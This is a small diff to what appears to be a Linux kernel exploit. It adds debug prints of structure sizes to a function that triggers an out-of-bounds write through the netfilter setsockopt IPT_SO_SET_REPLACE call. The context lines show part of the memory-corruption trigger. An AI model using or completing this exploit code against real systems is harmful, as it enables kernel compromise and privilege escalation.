@@ -311,6 +311,9 @@ int trigger_oob_write(int s) {
   strcpy(data.target.u.user.name, "NFQUEUE");
   data.target.u.user.revision = 1;
 
+  printf("Size of Target: %d\n",sizeof(data.target));
+  printf("Size of Data: %d\n",sizeof(data));
+  
   // Partially overwrite the adjacent buffer with 2 bytes of zero.
   if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
     if (errno == ENOPROTOOPT) {
